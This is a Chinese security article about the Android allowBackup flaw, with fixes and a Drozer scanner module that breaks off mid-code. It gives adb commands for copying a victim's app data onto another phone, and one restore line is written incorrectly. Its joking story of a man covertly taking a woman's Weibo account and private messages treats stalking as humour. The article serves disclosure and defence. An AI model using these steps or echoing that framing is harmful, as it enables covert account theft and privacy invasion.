<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title> 两分钟窃取身边女神微博帐号？详解Android App AllowBackup配置带来的风险 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="安卓安全,app数据安全,备份"/>
    
        <meta name="description" content="笔者在使用自己编写的Drozer模块对国内流行的安卓手机应用进行自动化扫描后发现有大量涉及用户财产和隐私的流行安卓应用存在Android AllowBackup漏洞，已测试成功受到漏洞影响的应用包括："/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2> 两分钟窃取身边女神微博帐号？详解Android App AllowBackup配置带来的风险</h2>
                <div class="article-msg">
                    <span class="time">2015-03-10 20:34:29</span>
                                        <span class="read">阅读：32084次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_290"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="290" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://www.droidsec.cn/%E8%AF%A6%E8%A7%A3android-app-allowbackup%E9%85%8D%E7%BD%AE%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%A3%8E%E9%99%A9/"
                             target="_blank">来源： 安卓安全中文站</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><img style="width: 600px; height: 231px;" alt="t016529721b093808c4.png" src="http://p6.qhimg.com/t016529721b093808c4.png" title="t016529721b093808c4.png" height="231" border="0" vspace="0" width="600"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">笔者在使用自己编写的Drozer模块对国内流行的安卓手机应用进行自动化扫描后发现有大量涉及用户财产和隐私的流行安卓应用存在Android AllowBackup漏洞，已测试成功受到漏洞影响的应用包括：新浪微博，百度云网盘，美团，大众点评，去哪儿等等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">[0x00] 漏洞案例</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 先来看一个情景案例，某IT男一直暗恋部门某女神，一天女神手机太卡了找IT男帮助清理手机空间，IT男高兴地答应女神两分钟搞定，屁颠屁颠的跑到自己电
脑旁边连上手机，女神在一边呆呆的看着IT男敲了几行代码然后在手机上点了几下，最后果然两分钟不到就搞定了，在女神谢着离开后，IT男露出了WS的笑
容。</span></p><p style="text-align:center"><img style="width: 500px; height: 381px;" title="wb" src="http://p1.qhimg.com/t017cdfbd3cc6722754.jpg" alt="wb" height="381" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">没错，他成功了盗到了女神的微博帐号，终于不用问同事女神的微博帐号是多少了~当然这不是结局，一天晚上睡觉时，他看了女神的微博私信后心突然碎了。<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">到底发生了什么，这背后有啥不可告人的秘密？且看本文详细分析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">[0x01] 漏洞背景</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在谷歌2010年发布Android 2.2 Froyo 
(冻酸奶)系统中，谷歌引入一个了系统备份的功能，允许用户备份系统应用和第三方应用的apk安装包和应用数据，以便在刷机或者数据丢失后恢复应用。 
第三方应用开发者需要在应用的AndroidManifest.xml文件中配置allowBackup标志(默认为true)来设置应用数据是否能能够
被备份或恢复。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 当这个标志被设置为true时应用程序数据可以在手机未获取ROOT的情况下通过adb调试工具来备份和恢复，这就允许恶意攻击者在接触用户手机的情况下
在短时间内启动手机USB调试功能来窃取那些能够受到AllowBackup漏洞影响的应用的数据，造成用户隐私泄露甚至财产损失。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 使用反编绎工具JEB查看weibo客户端manifest配置：</span></p><p style="text-align:center"><img style="width: 600px; height: 69px;" title="jebmanifest" src="http://p0.qhimg.com/t019ba8f70e30ab18e8.jpg" alt="jebmanifest" height="69" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 在之前的案例正是因为新浪微博安卓客户端(最新版)AndroidManifest.xml并没有配置
android:allowBackup=“false”，导致女神手机中的微博客户端数据可以在短时间内通过ADB调试备份到电脑中最后恢复到IT男手
机，然后IT男以后每天就可以用女神的帐号看女神发了啥微博和私信内容。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 当然可利用的场景当然不止于此，想想，如果存在漏洞的是你的团购应用呢（看看有啥团购券我先来用吧），当然还有你的网盘应用（说不定可以看女神的私密照~），哦，对了连社交和理财应用也不能放过（女神们还敢把手机给IT男清理不）。。。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">[0x02] 检测方法</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">（1）手工检测</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">测试环境：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">1.Windows 7，ADB调试工具</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">2.物理接触目标手机1，连接手机1到PC端</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">3.手机1和手机2均未被ROOT，开启USB调试</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">4.不用安装其它应用，不启动被测试的应用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">测试流程：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">1.连接安装开启USB调试手机1 到PC端</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">2.在PC自动（也可以提前）安装好手机驱动后</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">3.启动命令行界面输入以下命令：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:bash;toolbar:false">#adb&nbsp;devices
显示已连接的设备列表，测试手机是否正常连接
#adb&nbsp;backup&nbsp;-nosystem&nbsp;-noshared&nbsp;-apk&nbsp;-f&nbsp;com.sina.weibo.ab&nbsp;com.sina.weibo
-nosystem表示不备份系统应用&nbsp;-noshared表示不备份应用存储在SD中的数据&nbsp;-apk表示备份应用APK安装包&nbsp;-f&nbsp;表示备份的.ab文件路径和文件名&nbsp;最后是要备份应用的packageName</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">4.点击手机1确认备份界面的“备份我的数据”</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">5.等待备份完成，至此微博客户端数据成功备份为com.sina.weibo.ab文件</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">6.断开手机1的连接，可以把手机还给女神啦</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">7. 连接手机2 ，在命令行界面下输入以下命令：</span></p><pre class="brush:bash;toolbar:false">#adb&nbsp;kill-server&nbsp;&nbsp;
关闭ADB
#adb&nbsp;devices&nbsp;
重新启动ADB，检测手机2是否成功连接&nbsp;
#adb&nbsp;backup&nbsp;com.sina.weibo.ab</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">8.点击手机2确认恢复界面的“恢复我的数据”</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">9.等待恢复完成</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">10.打开手机2中新安装的微博客户端，测试可正常登录手机1中帐号执行各种操作，且长期有效。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">（2）在线检测</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">目前国内三个主要的Android应用漏洞在线检测系统均能较好的检测此漏洞，建议普通用户和开发者使用腾讯金刚审计系统上传应用安装包进行检测。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">1.腾讯金刚审计系统检测结果（ </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://service.security.tencent.com/kingkong"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://service.security.tencent.com/kingkong</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> ）</span></p><p style="text-align:center"><img style="width: 500px; height: 120px;" title="kingkongscan" src="http://p5.qhimg.com/t016d4253e07462b38a.jpg" alt="kingkongscan" height="120" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">2.阿里聚安全检测结果（ </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://jaq.alibaba.com/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://jaq.alibaba.com/</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> ）</span></p><p style="text-align:center"><img style="width: 500px; height: 76px;" title="aliscan" src="http://p4.qhimg.com/t01281f28cc3e567cc6.jpg" alt="aliscan" height="76" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">3.360捉虫猎手检测结果（ </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://appscan.360.cn/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://appscan.360.cn/</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> ）</span></p><p style="text-align:center"><img style="width: 500px; height: 123px;" title="360scan" src="http://p1.qhimg.com/t0110ebe111e4616894.jpg" alt="360scan" height="123" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">[0x03] 影响范围</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 目前测试了手上一台安装有Android 4.1.1系统的魅族MX2手机和安装有Android 4.4.2系统的魅族MX4手机均测试成功，理论上影响Android 2.2-Android 4.4系统中存在风险的应用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 建议评级：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 尽管此漏洞的利用条件较高，需要物理接触，但此漏洞对涉及用户财产与隐私类的APP来说杀伤力较大，建议厂商视情况修复。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">1.金融类APP 高危</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">2.支付类APP 高危</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">3.团购类APP 中危</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">4.社交类APP 中危</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">5.网盘类APP 中危</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">6.其它类APP 低危/无影响</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;[0x04] 修复方案 </span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">开发者如要避免应用数据泄露的风险，应当在设置AndroidManifest.xml
文件中配置android:allowBackup=“false”，此时应用程序数据无法被备份和恢复。或者在应用启动时检测手机硬件和网络环境是否改
变，如果存在异常则强制退出或重新登录。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;<span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);"><strong>[0x05] 编写Drozer模块实现漏洞自动化扫描</strong></span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> Drozer是MWR InfoSecurity公司开发的一款安卓应用安全评估框架，其社区版开源在Github上（</span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="https://github.com/mwrlabs/drozer"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://github.com/mwrlabs/drozer</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> ）。对于从事安卓应用漏洞测试的安全研究者们来说，他们可以使用drozer提供的框架自己编写模块(Module)方便对的安卓应用进行漏洞检测与利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 以下是自己编写一个Drozer Module，用于自动化批量检测手机中的哪些应用存在AllowBackup风险。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">import&nbsp;re
&nbsp;
from&nbsp;drozer&nbsp;import&nbsp;android
&nbsp;
from&nbsp;drozer.modules&nbsp;import&nbsp;common,&nbsp;Module
&nbsp;
class&nbsp;AbChecker(Module,&nbsp;common.Assets,common.PackageManager):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;=&nbsp;&quot;check&nbsp;if&nbsp;app&nbsp;can&nbsp;be&nbsp;backup&nbsp;and&nbsp;restore&nbsp;by&nbsp;usb&nbsp;debugging&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;description&nbsp;=&nbsp;&quot;see:htttp://www.droidsec.cn&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;examples&nbsp;=&quot;&quot;&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;dz&gt;&nbsp;run&nbsp;scanner.misc.abchecker&nbsp;-a
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;it&nbsp;will&nbsp;run&nbsp;the&nbsp;script&nbsp;to&nbsp;check&nbsp;all&nbsp;apps
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;dz&gt;&nbsp;run&nbsp;scanner.misc.abchecker&nbsp;-p&nbsp;com.android.chrome
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;-&gt;&nbsp;it&nbsp;will&nbsp;run&nbsp;the&nbsp;script&nbsp;to&nbsp;check&nbsp;the&nbsp;provided&nbsp;package
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;author&nbsp;=&nbsp;&quot;DroidSec.cn&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;date&nbsp;=&nbsp;&quot;2015-03-07&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;license&nbsp;=&nbsp;&quot;BSD&nbsp;(3-clause)&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;=&nbsp;[&quot;scanner&quot;,&nbsp;&quot;misc&quot;]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;permissions&nbsp;=&nbsp;[&quot;com.mwr.dz.permissions.GET_CONTEXT&quot;]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;VULNERABLE_API&nbsp;=&nbsp;&#39;android:allowBackup=&quot;true&quot;&#39;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;add_arguments(self,&nbsp;parser):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-p&quot;,&nbsp;dest=&quot;pkg&quot;,help=&quot;the&nbsp;identifier&nbsp;of&nbsp;the&nbsp;package&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-a&quot;,&nbsp;action=&quot;store_true&quot;,dest=&quot;all&quot;,help=&quot;the&nbsp;identifier&nbsp;of&nbsp;the&nbsp;package&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;execute(self,&nbsp;arguments):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;arguments.pkg&nbsp;!=&nbsp;None:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#self.stdout.write(arguments.pkg)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.__write_manifest(arguments.pkg)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;arguments.all&nbsp;==&nbsp;True:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.stdout.write(&quot;[color&nbsp;yellow]&nbsp;Start&nbsp;scan[/color]&quot;+&quot;\n&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;package&nbsp;in&nbsp;self.packageManager().getPackages(common.PackageManager.GET_PERMISSIONS):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.__write_manifest(package.packageName)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;Exception,&nbsp;e:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;str(e)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.stdout.write(&quot;[color&nbsp;yellow]&nbsp;Scan&nbsp;finish[/color]&quot;+&quot;\n&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__write_manifest(self,&nbsp;package):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lines=self.getAndroidManifest(package).split(&quot;\n&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r1=re.compile(r&#39;\&lt;application&#39;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r2=re.compile(r&#39;allowBackup=&quot;false&quot;&#39;)
&nbsp;
